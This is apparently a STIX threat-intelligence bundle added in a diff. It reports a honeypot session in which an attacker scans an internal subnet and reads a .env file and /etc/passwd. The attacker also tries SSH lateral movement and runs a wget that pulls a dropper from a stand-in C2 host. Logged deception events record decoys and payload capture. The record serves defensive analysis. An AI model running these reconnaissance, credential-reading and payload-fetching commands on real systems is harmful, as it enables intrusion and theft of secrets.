@@ -1,0 +1,160 @@
+{
+  "type": "bundle",
+  "id": "bundle--f8c7ec58-4cc8-4a26-9668-d89df602230d",
+  "objects": [
+    {
+      "type": "identity",
+      "spec_version": "2.1",
+      "id": "identity--ea2bf7a6-21b9-48c0-84da-77575840c28a",
+      "created": "2026-06-11T08:09:25+00:00",
+      "modified": "2026-06-11T08:09:25+00:00",
+      "name": "ChakravyuhNet",
+      "identity_class": "system"
+    },
+    {
+      "type": "ipv4-addr",
+      "spec_version": "2.1",
+      "id": "ipv4-addr--da805232-56ce-49f2-b780-10a320772161",
+      "value": "203.0.113.77"
+    },
+    {
+      "type": "malware",
+      "spec_version": "2.1",
+      "id": "malware--85105a83-8128-4199-bc5c-e7068308e7a6",
+      "created": "2026-06-11T08:09:25+00:00",
+      "modified": "2026-06-11T08:09:25+00:00",
+      "name": "Captured payload fb08049f5962",
+      "is_family": false,
+      "description": "Payload captured by ChakravyuhNet and stored inertly for analysis.",
+      "x_chakravyuhnet_sha256": "fb08049f5962d3cc90bc6adf26116cee735f03b4c664f3018661dc582e92f3b7",
+      "x_chakravyuhnet_filename": "dropper-demo.bin",
+      "x_chakravyuhnet_size_bytes": 67
+    },
+    {
+      "type": "attack-pattern",
+      "spec_version": "2.1",
+      "id": "attack-pattern--19de43b9-0f7c-40e7-9dbd-a0c7618c606f",
+      "created": "2026-06-11T08:09:25+00:00",
+      "modified": "2026-06-11T08:09:25+00:00",
+      "name": "Network Service Discovery",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1046"
+        }
+      ]
+    },
+    {
+      "type": "report",
+      "spec_version": "2.1",
+      "id": "report--b675ac69-e676-42b4-ab50-6c957ff0151e",
+      "created": "2026-06-11T08:09:25+00:00",
+      "modified": "2026-06-11T08:09:25+00:00",
+      "name": "ChakravyuhNet honeypot incident report",
+      "published": "2026-06-11T08:09:25+00:00",
+      "report_types": [
+        "threat-report"
+      ],
+      "object_refs": [
+        "identity--ea2bf7a6-21b9-48c0-84da-77575840c28a",
+        "ipv4-addr--da805232-56ce-49f2-b780-10a320772161",
+        "malware--85105a83-8128-4199-bc5c-e7068308e7a6"
+      ],
+      "x_chakravyuhnet_commands": [
+        {
+          "command": "nmap -sS -Pn 10.77.4.0/24",
+          "timestamp": "2026-06-11T08:08:45.562150+00:00",
+          "output_preview": "Starting Nmap 7.95\nNmap scan report for 10.77.4.1\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n5432/tcp open  postgresql\n8080/tcp open  http-proxy\nNmap done: 1 IP address scanned in 93.42 seconds"
+        },
+        {
+          "command": "whoami",
+          "timestamp": "2026-06-11T08:08:47.171461+00:00",
+          "output_preview": "svc-finance"
+        },
+        {
+          "command": "ls -la",
+          "timestamp": "2026-06-11T08:08:47.881183+00:00",
+          "output_preview": "total 72\ndrwxr-x---  8 svc-finance finance 4096 Jun  2 09:41 .\ndrwxr-xr-x  5 root        root    4096 May 28 18:03 ..\n-rw-------  1 svc-finance finance  736 Jun  1 23:19 .env\ndrwxr-x---  3 svc-finance finance 4096 May 31 11:04 config\ndrwxr-x---  5 svc-finance finance 4096 Jun  2 "
+        },
+        {
+          "command": "cat .env",
+          "timestamp": "2026-06-11T08:08:48.568711+00:00",
+          "output_preview": "APP_ENV=production\nDB_HOST=10.77.4.18\nDB_NAME=quarterly_finance\nDB_USER=finance_ro\nDB_PASSWORD=<redacted by kernel keyring>\nS3_BUCKET=fin-exports-archive"
+        },
+        {
+          "command": "cat /etc/passwd",
+          "timestamp": "2026-06-11T08:08:49.590013+00:00",
+          "output_preview": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsvc-finance:x:1003:1003:Finance API:/srv/finance-api:/bin/bash\nbackup:x:1007:1007:Nightly Backup:/var/backups:/bin/bash"
+        },
+        {
+          "command": "ssh svc-finance@10.77.4.18",
+          "timestamp": "2026-06-11T08:08:50.512925+00:00",
+          "output_preview": "The authenticity of host '10.77.4.18' cannot be established.\nED25519 key fingerprint is SHA256:8T3 fake-lab-fingerprint.\nPermission denied (publickey)."
+        },
+        {
+          "command": "wget http://evil.c2/dropper.bin -O /tmp/.cache",
+          "timestamp": "2026-06-11T08:08:51.730102+00:00",
+          "output_preview": "HTTP/1.1 200 OK\nserver: nginx/1.24.0\ncontent-length: 18421\nsaved response body to ./exports/session-cache.bin"
+        }
+      ],
+      "x_chakravyuhnet_ai_events": [
+        {
+          "message": "Maze initialized with low-interaction gateway decoys.",
+          "level": "info",
+          "timestamp": "2026-06-11T08:08:44.959248+00:00"
+        },
+        {
+          "message": "Aggressive tool detected: 'nmap'.  Tarpit swarm activated \u2014 synthetic latency injected to degrade tool accuracy.",
+          "level": "warn",
+          "timestamp": "2026-06-11T08:08:45.562150+00:00"
+        },
+        {
+          "message": "Benign reconnaissance: 'whoami'.  Serving plausible fake output.  No topology change required.",
+          "level": "info",
+          "timestamp": "2026-06-11T08:08:47.171461+00:00"
+        },
+        {
+          "message": "Benign reconnaissance: 'ls'.  Serving plausible fake output.  No topology change required.",
+          "level": "info",
+          "timestamp": "2026-06-11T08:08:47.881183+00:00"
+        },
+        {
+          "message": "Sensitive data access: 'cat' targeting secrets.  Serving honeytokens.  Node telemetry pulse triggered.",
+          "level": "warn",
+          "timestamp": "2026-06-11T08:08:48.568711+00:00"
+        },
+        {
+          "message": "Sensitive data access: 'cat' targeting secrets.  Serving honeytokens.  Node telemetry pulse triggered.",
+          "level": "warn",
+          "timestamp": "2026-06-11T08:08:49.590013+00:00"
+        },
+        {
+          "message": "Lateral movement attempt via 'ssh'.  RL policy spawning decoy infrastructure along predicted attacker path.",
+          "level": "alert",
+          "timestamp": "2026-06-11T08:08:50.512925+00:00"
+        },
+        {
+          "message": "WEAPON DETECTED: 'wget' \u2014 payload staging/execution attempt.  Trapdoor engaged.  Vault capture sequence initiated.",
+          "level": "alert",
+          "timestamp": "2026-06-11T08:08:51.730102+00:00"
+        },
+        {
+          "message": "Trapdoor triggered.  Payload sealed and hashing completed.",
+          "level": "alert",
+          "timestamp": "2026-06-11T08:09:07.564101+00:00"
+        },
+        {
+          "message": "Trapdoor triggered.  Payload sealed and hashing completed.",
+          "level": "alert",
+          "timestamp": "2026-06-11T08:09:14.081523+00:00"
+        },
+        {
+          "message": "Trapdoor triggered.  Payload sealed and hashing completed.",
+          "level": "alert",
+          "timestamp": "2026-06-11T08:09:25.917558+00:00"
+        }
+      ],
+      "x_chakravyuhnet_phase": "payload_captured"
+    }
+  ]
+}
